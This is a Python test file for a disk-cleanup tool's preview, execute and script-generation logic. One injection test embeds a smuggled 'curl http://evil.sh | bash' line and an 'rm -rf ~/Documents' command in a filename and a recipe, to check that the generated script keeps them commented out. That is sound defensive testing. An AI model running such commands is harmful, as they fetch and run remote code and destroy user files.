from datetime import UTC, datetime
from pathlib import Path

from devdoctor import cleanup
from devdoctor.cleanup import build_script, run
from devdoctor.types import (
    AdviceAction,
    CleanupOpts,
    DeletePathAction,
    Entry,
    Report,
    Risk,
    ShellResult,
)
from tests.conftest import FakeShell


def _report(*entries: Entry) -> Report:
    return Report(
        entries=list(entries),
        scanned_at=datetime(2026, 4, 18, tzinfo=UTC),
        hostname="h",
        platform="darwin",
    )


def _e(provider, id_, size, risk=Risk.SAFE, recipe=None, actions=None) -> Entry:
    return Entry(
        provider=provider,
        id=id_,
        path=Path(f"/{id_}"),
        label=f"{provider}/{id_}",
        size_bytes=size,
        mtime=None,
        risk=risk,
        recipe=recipe or [f"rm -rf /{id_}"],
        actions=actions or (),
    )


def _never_prompt(_entry):
    raise AssertionError("prompt must not be called in preview mode")


def _never_confirm(_msg):
    raise AssertionError("confirm must not be called in preview mode")


def test_preview_returns_dry_run_results_and_does_not_prompt():
    rep = _report(_e("a", "1", 100), _e("b", "1", 200))
    shell = FakeShell()
    results = run(
        rep,
        shell=shell,
        prompt_choice=_never_prompt,
        confirm=_never_confirm,
        opts=CleanupOpts(execute=False),
    )
    assert shell.calls == []
    assert [r.status for r in results] == ["dry_run", "dry_run"]
    assert [r.freed_bytes for r in results] == [100, 200]
    assert [r.entry_id for r in results] == ["1", "1"]


def test_preview_respects_provider_filter():
    rep = _report(_e("a", "1", 100), _e("b", "1", 200))
    results = run(
        rep,
        shell=FakeShell(),
        prompt_choice=_never_prompt,
        confirm=_never_confirm,
        opts=CleanupOpts(execute=False, providers=frozenset({"b"})),
    )
    assert [r.entry_id for r in results] == ["1"]  # only 'b/1'
    assert results[0].freed_bytes == 200


def _scripted_choices(*choices):
    """Build a PromptChoice that returns the next scripted choice per call."""
    q = list(choices)

    def _prompt(_entry):
        return q.pop(0)

    return _prompt


def _always(value):
    def _f(_msg):
        return value

    return _f


def test_execute_yes_runs_shell_once_per_entry_after_final_confirm():
    rep = _report(_e("a", "1", 100, recipe=["rm -rf /1"]))
    shell = FakeShell(responses={("rm", "-rf", "/1"): ShellResult(0, "", "")})
    results = run(
        rep,
        shell=shell,
        prompt_choice=_scripted_choices("y"),
        confirm=_always(True),
        opts=CleanupOpts(execute=True),
    )
    assert shell.calls == [("rm", "-rf", "/1")]
    assert [(r.status, r.freed_bytes) for r in results] == [("ok", 100)]


def test_execute_skips_when_user_answers_n():
    rep = _report(_e("a", "1", 100, recipe=["rm -rf /1"]))
    shell = FakeShell()
    results = run(
        rep,
        shell=shell,
        prompt_choice=_scripted_choices("n"),
        confirm=_always(True),
        opts=CleanupOpts(execute=True),
    )
    assert shell.calls == []
    assert [r.status for r in results] == ["skipped"]


def test_execute_all_in_provider_auto_approves_rest():
    rep = _report(
        _e("a", "1", 100, recipe=["rm -rf /1"]),
        _e("a", "2", 200, recipe=["rm -rf /2"]),
        _e("b", "1", 50, recipe=["rm -rf /b1"]),
    )
    shell = FakeShell(
        responses={
            ("rm", "-rf", "/1"): ShellResult(0, "", ""),
            ("rm", "-rf", "/2"): ShellResult(0, "", ""),
            ("rm", "-rf", "/b1"): ShellResult(0, "", ""),
        }
    )
    results = run(
        rep,
        shell=shell,
        # "a" got "a" (approve all in provider), then b/1 got "y"
        prompt_choice=_scripted_choices("a", "y"),
        confirm=_always(True),
        opts=CleanupOpts(execute=True),
    )
    assert [r.status for r in results] == ["ok", "ok", "ok"]
    # All three ran; order respects input order
    assert len(shell.calls) == 3


def test_execute_skip_provider_skips_remaining_in_that_provider():
    rep = _report(
        _e("a", "1", 100, recipe=["rm -rf /1"]),
        _e("a", "2", 200, recipe=["rm -rf /2"]),
        _e("b", "1", 50, recipe=["rm -rf /b1"]),
    )
    shell = FakeShell(
        responses={
            ("rm", "-rf", "/1"): ShellResult(0, "", ""),
            ("rm", "-rf", "/b1"): ShellResult(0, "", ""),
        }
    )
    results = run(
        rep,
        shell=shell,
        prompt_choice=_scripted_choices("y", "s", "y"),  # a/1 y, a/2 s, b/1 y
        confirm=_always(True),
        opts=CleanupOpts(execute=True),
    )
    statuses = [r.status for r in results]
    assert statuses == ["ok", "skipped", "ok"]


def test_execute_quit_aborts_remaining_with_skipped_status():
    rep = _report(
        _e("a", "1", 100, recipe=["rm -rf /1"]),
        _e("a", "2", 200, recipe=["rm -rf /2"]),
    )
    shell = FakeShell(responses={("rm", "-rf", "/1"): ShellResult(0, "", "")})
    results = run(
        rep,
        shell=shell,
        prompt_choice=_scripted_choices("y", "q"),
        confirm=_always(True),
        opts=CleanupOpts(execute=True),
    )
    assert [r.status for r in results] == ["ok", "skipped"]


def test_execute_final_confirm_no_aborts_all_selected():
    rep = _report(_e("a", "1", 100, recipe=["rm -rf /1"]))
    shell = FakeShell()
    results = run(
        rep,
        shell=shell,
        prompt_choice=_scripted_choices("y"),
        confirm=_always(False),
        opts=CleanupOpts(execute=True),
    )
    assert shell.calls == []
    assert [r.status for r in results] == ["skipped"]


def test_execute_yes_safe_auto_approves_safe_without_prompt():
    rep = _report(
        _e("a", "1", 100, Risk.SAFE, recipe=["rm -rf /1"]),
        _e("a", "2", 200, Risk.RECLAIMABLE, recipe=["rm -rf /2"]),
    )
    shell = FakeShell(
        responses={
            ("rm", "-rf", "/1"): ShellResult(0, "", ""),
            ("rm", "-rf", "/2"): ShellResult(0, "", ""),
        }
    )
    # Only one prompt call (for the reclaimable entry).
    results = run(
        rep,
        shell=shell,
        prompt_choice=_scripted_choices("y"),
        confirm=_always(True),
        opts=CleanupOpts(execute=True, yes_safe=True),
    )
    assert [r.status for r in results] == ["ok", "ok"]
    assert len(shell.calls) == 2


def test_execute_dangerous_without_allow_dangerous_marks_skipped_with_note():
    rep = _report(
        _e("a", "1", 100, Risk.DANGEROUS, recipe=["rm -rf /1"]),
        _e("b", "1", 50, Risk.SAFE, recipe=["rm -rf /b1"]),
    )
    shell = FakeShell(responses={("rm", "-rf", "/b1"): ShellResult(0, "", "")})
    results = run(
        rep,
        shell=shell,
        prompt_choice=_scripted_choices("y"),  # only b/1 prompts
        confirm=_always(True),
        opts=CleanupOpts(execute=True),
    )
    statuses = {(r.entry_id, r.status) for r in results}
    assert (("1", "skipped") in statuses) and (("1", "ok") in statuses)
    # Find the dangerous one and confirm the message tag
    dangerous = next(r for r in results if r.status == "skipped")
    assert "dangerous" in (dangerous.message or "").lower()


def test_execute_shell_failure_becomes_error_status():
    rep = _report(_e("a", "1", 100, recipe=["rm -rf /1"]))
    shell = FakeShell(responses={("rm", "-rf", "/1"): ShellResult(1, "", "boom")})
    results = run(
        rep,
        shell=shell,
        prompt_choice=_scripted_choices("y"),
        confirm=_always(True),
        opts=CleanupOpts(execute=True),
    )
    assert results[0].status == "error"
    assert "boom" in (results[0].message or "")
    assert results[0].freed_bytes == 0


def test_build_script_labels_mixed_risk_provider():
    rep = _report(
        _e("p", "1", 100, Risk.SAFE, recipe=["rm -rf /1"]),
        _e("p", "2", 200, Risk.DANGEROUS, recipe=["rm -rf /2"]),
    )
    script = build_script(rep)
    assert "risk=mixed" in script


def test_build_script_has_shebang_and_warning_header():
    rep = _report(_e("a", "1", 100))
    script = build_script(rep)
    assert script.startswith("#!/usr/bin/env bash\n")
    assert "commented out" in script.lower()


def test_build_script_comments_all_destructive_lines():
    rep = _report(_e("a", "1", 100, recipe=["rm -rf /1", "echo done"]))
    script = build_script(rep)
    # Every recipe line must be prefixed with a comment.
    for line in ["rm -rf /1", "echo done"]:
        assert f"#   {line}" in script
        # The uncommented line must not appear.
        assert f"\n{line}\n" not in script


def test_build_script_groups_by_provider_with_totals():
    rep = _report(
        _e("a", "1", 100, recipe=["rm -rf /1"]),
        _e("a", "2", 200, recipe=["rm -rf /2"]),
        _e("b", "1", 50, recipe=["rm -rf /b1"]),
    )
    script = build_script(rep)
    assert "# --- a: ~300 reclaimable bytes" in script
    assert "# --- b: ~50 reclaimable bytes" in script


def test_build_script_newline_in_filename_cannot_inject_uncommented_lines():
    # A filename with an embedded newline (legal on macOS/Linux) must not break
    # out of its "# ..." comment and leave an executable line in the script.
    evil = Entry(
        provider="large-files",
        id="x",
        path=Path("/x"),
        label="/Users/x/Desktop/holiday\ncurl http://evil.sh | bash\n.iso",
        size_bytes=536870912,
        mtime=None,
        risk=Risk.DANGEROUS,
        recipe=["echo 'note\nrm -rf ~/Documents\ndone'"],
    )
    script = build_script(_report(evil))
    prose = {"#!/usr/bin/env bash", "# DevDoctor disk cleanup script", "set -euo pipefail"}
    for line in script.splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#") or stripped in prose:
            continue
        raise AssertionError(f"uncommented line leaked into script: {line!r}")
    # The content is still visible for review, just escaped onto one line.
    assert "curl http://evil.sh | bash" in script
    assert "\\n" in script


def _events_of(report, opts, *, shell=None, prompt=None, confirm=None):
    seen: list[object] = []
    results = run(
        report,
        shell=shell or FakeShell(),
        prompt_choice=prompt or (lambda entry: "y"),
        confirm=confirm or (lambda msg: True),
        opts=opts,
        on_event=seen.append,
    )
    return seen, results


def test_run_delivers_every_event_to_the_observer_in_order() -> None:
    a = _e("a", "1", 100, actions=(DeletePathAction(Path("/1")),))
    shell = FakeShell(responses={("rm", "-rf", "--", "/1"): ShellResult(0, "", "")})
    seen, results = _events_of(_report(a), CleanupOpts(execute=True), shell=shell)

    kinds = [type(e).__name__ for e in seen]
    assert kinds == ["PromptRequired", "ConfirmRequired", "ExecuteStep", "EntryResolved"]
    assert [r.status for r in results] == ["ok"]


def test_confirm_required_carries_the_plan_in_execution_order() -> None:
    small = _e("a", "small", 10, actions=(DeletePathAction(Path("/small")),))
    big = _e("a", "big", 1000, actions=(DeletePathAction(Path("/big")),))
    unknown = Entry(
        provider="b",
        id="hint",
        path=Path("/hint"),
        label="b/hint",
        size_bytes=5,
        mtime=None,
        risk=Risk.SAFE,
        recipe=[],
        actions=(AdviceAction("run the tool yourself"),),
        usage=None,
    )
    shell = FakeShell(
        responses={
            ("rm", "-rf", "--", "/small"): ShellResult(0, "", ""),
            ("rm", "-rf", "--", "/big"): ShellResult(0, "", ""),
        }
    )
    seen, _ = _events_of(
        _report(small, big, unknown), CleanupOpts(execute=True, yes_safe=True), shell=shell
    )

    (confirm,) = [e for e in seen if isinstance(e, cleanup.ConfirmRequired)]
    assert [p.entry.id for p in confirm.plan] == [e.id for e in confirm.approved]
    by_id = {p.entry.id: p for p in confirm.plan}
    assert by_id["small"].lines == ("rm -rf -- /small",)
    assert by_id["small"].estimate_bytes == 10
    assert by_id["hint"].lines == ("echo 'run the tool yourself'",)
    assert by_id["hint"].estimate_bytes == 5
    # Execution order: the plan's order is the order EntryResolved arrives in.
    resolved = [e.result.entry_id for e in seen if isinstance(e, cleanup.EntryResolved)]
    assert resolved == [p.entry.id for p in confirm.plan]


def test_plan_is_empty_when_nothing_is_approved() -> None:
    seen, _ = _events_of(
        _report(_e("a", "1", 100)), CleanupOpts(execute=True), prompt=lambda e: "n"
    )
    assert not any(isinstance(e, cleanup.ConfirmRequired) for e in seen)


class _RecordingLogger:
    """Records `.warning(msg, *args)` calls the way `cleanup.logger` does.

    A real logger under caplog only works when the `devdoctor` logger tree
    still propagates to the root handler caplog installs; CLI tests
    (`test_cli.py`) invoke `configure_logging`, which sets `propagate = False`
    on the `devdoctor` logger for the rest of the process, so this test would
    fail whenever it runs after one of those (order-dependent, and it does in
    the full suite). Monkeypatching `cleanup.logger` with this recorder
    sidesteps the logging tree entirely, so the test needs no assumption
    about what ran before it.
    """

    def __init__(self) -> None:
        self.warnings: list[str] = []

    def warning(self, msg: str, *args: object, **kwargs: object) -> None:
        self.warnings.append(msg % args if args else msg)


def test_a_raising_observer_never_changes_the_run(monkeypatch) -> None:
    a = _e("a", "1", 100, actions=(DeletePathAction(Path("/1")),))
    shell = FakeShell(responses={("rm", "-rf", "--", "/1"): ShellResult(0, "", "")})
    reference = run(
        _report(a),
        shell=shell,
        prompt_choice=lambda e: "y",
        confirm=lambda m: True,
        opts=CleanupOpts(execute=True),
    )

    def bad(event: object) -> None:
        raise ValueError("presenter bug")

    fake_logger = _RecordingLogger()
    monkeypatch.setattr(cleanup, "logger", fake_logger)
    results = run(
        _report(a),
        shell=FakeShell(responses=shell.responses),
        prompt_choice=lambda e: "y",
        confirm=lambda m: True,
        opts=CleanupOpts(execute=True),
        on_event=bad,
    )

    assert [(r.entry_id, r.status) for r in results] == [(r.entry_id, r.status) for r in reference]
    messages = [m for m in fake_logger.warnings if "cleanup observer" in m]
    assert {m.split()[-1] for m in messages} == {
        "PromptRequired",
        "ConfirmRequired",
        "ExecuteStep",
        "EntryResolved",
    }


def test_confirm_summary_is_human_readable() -> None:
    a = _e("a", "1", 5_600_000_000)
    event = cleanup.ConfirmRequired(approved=[a], total_bytes=5_600_000_000, unknown_entries=0)
    assert cleanup._confirm_summary(event) == "Execute these 1 entries (~5.2G estimated)?"
    event = cleanup.ConfirmRequired(approved=[a, a], total_bytes=1024, unknown_entries=2)
    assert (
        cleanup._confirm_summary(event) == "Execute these 2 entries (~1.0K estimated, +2 unknown)?"
    )


async def test_run_async_delivers_events_to_the_observer() -> None:
    a = _e("a", "1", 100)

    async def run_line(argv):
        return ShellResult(0, "", "")

    async def prompt(entry):
        return "y"

    async def confirm(msg):
        return True

    seen: list[object] = []
    results = await cleanup.run_async(
        _report(a),
        run_line=run_line,
        prompt_choice=prompt,
        confirm=confirm,
        opts=CleanupOpts(execute=True),
        on_event=seen.append,
    )
    assert [type(e).__name__ for e in seen] == [
        "PromptRequired",
        "ConfirmRequired",
        "ExecuteStep",
        "EntryResolved",
    ]
    assert [r.status for r in results] == ["ok"]
